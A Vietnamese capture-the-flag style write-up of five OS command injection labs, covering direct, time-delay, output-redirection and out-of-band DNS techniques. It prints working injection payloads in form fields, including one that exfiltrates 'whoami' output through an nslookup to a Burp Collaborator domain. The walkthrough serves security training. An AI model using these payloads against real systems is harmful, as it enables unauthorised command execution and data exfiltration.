# OS command injection, simple case
## Target goal
Bài lab có lỗ hổng OS command injection ở phần kiểm tra số lượng sản phẩm

Ứng dụng thực thi lệnh shell có chứa sản phẩm do người dùng cung cấp và lưu trữ ID và trả về đầu ra từ lệnh trong phản hồi của nó.

Để giải bài lab, chạy lệnh `whoami` để biết tên người dùng hiện tại.

## Analysis and exploit
Trang web sử dụng script được viết trong file `stockCheck.js` để thực hiện kiểm tra số hàng còn trong kho và trả về output cho người dùng. Cụ thể, command có dạng:
```
stockCheck.js <productId> <storeId>
```
![image](https://hackmd.io/_uploads/rypatmbpkx.png)

Thử với sản phẩm bất kì, ở đây là sản phẩm đầu tiên có `productId=1` và `storeId=1`. Lúc này command sẽ là:
```
stockCheck.js 1 1
```

Như vậy ta hoàn toàn có thể chèn OS command vào `productId` hoặc `storeId` để thực hiện lệnh mong muốn. Thử dùng `echo` ở `storeId` với payload `1; echo 'van'` 

![image](https://hackmd.io/_uploads/S10Mc7bTyl.png)

Lúc này có thể thấy dòng chữ `van` đã được trả về. Bây giờ chỉ việc thay lệnh `echo 'van'` thành `whoami` 

![image](https://hackmd.io/_uploads/rJK2c7W6Jg.png)

# Blind OS command injection with time delays
## Target goal
Bài lab có lỗ hổng OS command injection ở phần submit feedback

Ứng dụng thực thi lệnh shell có chứa sản phẩm do người dùng cung cấp và lưu trữ ID và trả về đầu ra từ lệnh trong phản hồi của nó.

Để giải bài lab, khai thác lỗ hổng blind OS CMDI làm server delay 10 giây

## Analysis and exploit
![image](https://hackmd.io/_uploads/H1Kw3QW6ye.png)

server sẽ thực thi lệnh sau khi nhận được feedback từ người dùng
```
mail -s "oooooooooooooo" -aFrom:vandz@gmail.com feedback@vulnerable-website.com
```

Có thể thấy email của người dùng là vị trí ta có thể chèn lệnh OS bất kì. Thực hiện thêm payload vào sau email như sau: `vandz@gmail.com || ping -c 10 127.0.0.1 ||`

![image](https://hackmd.io/_uploads/Bk4YTXZayx.png)


# Blind OS command injection with output redirection
## Target goal
Bài lab có lỗ hổng OS command injection ở phần submit feedback

Ứng dụng thực thi lệnh shell chứa các chi tiết do người dùng cung cấp. Đầu ra từ lệnh không được trả về trong phản hồi. Tuy nhiên, bạn có thể sử dụng chuyển hướng đầu ra để nắm bắt đầu ra từ lệnh. Có một thư mục có thể ghi tại:

```
/var/www/images/
```

Bạn có thể chuyển hướng đầu ra từ lệnh được inject sang một tệp trong thư mục này, sau đó sử dụng URL tải hình ảnh để truy xuất nội dung của tệp.

Để giải bài lab, chạy lệnh `whoami` để biết tên người dùng hiện tại.

## Analysis and exploit
Lần này ta sẽ ghi output của command vào 1 file thuộc folder mà user hiện tại có quyền ghi, đó là `/var/www/images/`. Thư mục này chính là nơi chứa các ảnh mà ứng dụng load cho posts thông qua param `filename`.

Ta sẽ chèn command vào trường `email` như hình dưới. Cụ thể output của lệnh `whoami` sẽ được ghi vào file `/var/www/images/whoami`.
```
|| whoami > /var/www/images/output.txt ||
```

![image](https://hackmd.io/_uploads/H1PRAmbTke.png)

Tiến hành đọc file tại `/var/www/images/output.txt`

![image](https://hackmd.io/_uploads/HyLMk4WTJx.png)

# Blind OS command injection with out-of-band interaction
## Target goal
Bài lab có lỗ hổng OS command injection ở phần submit feedback

Ứng dụng thực thi lệnh shell chứa các chi tiết do người dùng cung cấp. Đầu ra từ lệnh không được trả về trong phản hồi. Tuy nhiên, bạn có thể trigger ra bên ngoài domain khác

Để giải bài lab, khai thác blind OS CMDI to DNS lookup to Burp Collaborator

## Analysis and exploit
Lần này ta sẽ sử dụng lệnh `nslookup` để query DNS đến domain ngoài. Sử dụng Burp Collaborator để host domain. Payload để chèn giống như hình dưới

![image](https://hackmd.io/_uploads/SJVW-EZTyx.png)

Kiểm tra Burp Collaborator ta thấy đã có các DNS query xuất hiện.

![image](https://hackmd.io/_uploads/Hy_GWNWaJg.png)

# Blind OS command injection with out-of-band data exfiltration
## Target goal
Bài lab có lỗ hổng OS command injection ở phần submit feedback

Ứng dụng thực thi lệnh shell chứa các chi tiết do người dùng cung cấp. Đầu ra từ lệnh không được trả về trong phản hồi. Tuy nhiên, bạn có thể trigger ra bên ngoài domain khác

Để giải bài lab, khai thác blind OS CMDI to DNS lookup to Burp Collaborator đồng thời chạy với lệnh `whoami` để xem người dùng hiện tại

## Analysis and exploit
Lần này yêu cầu phức tạp hơn đó là output command thông qua các DNS query. Khi sử dụng lệnh sau, ta sẽ lấy được output của lệnh `whoami` qua DNS query
```
nslookup `whoami`.<Collaborator domain>`
```

Chèn payload như hình vào trường `email`

![image](https://hackmd.io/_uploads/ByozM4Wpke.png)

Kiểm tra Burp Collaborator ta thấy đã có các DNS query xuất hiện cùng với đầu ra của lệnh `whoami`.

![image](https://hackmd.io/_uploads/SJ7ef4Zake.png)
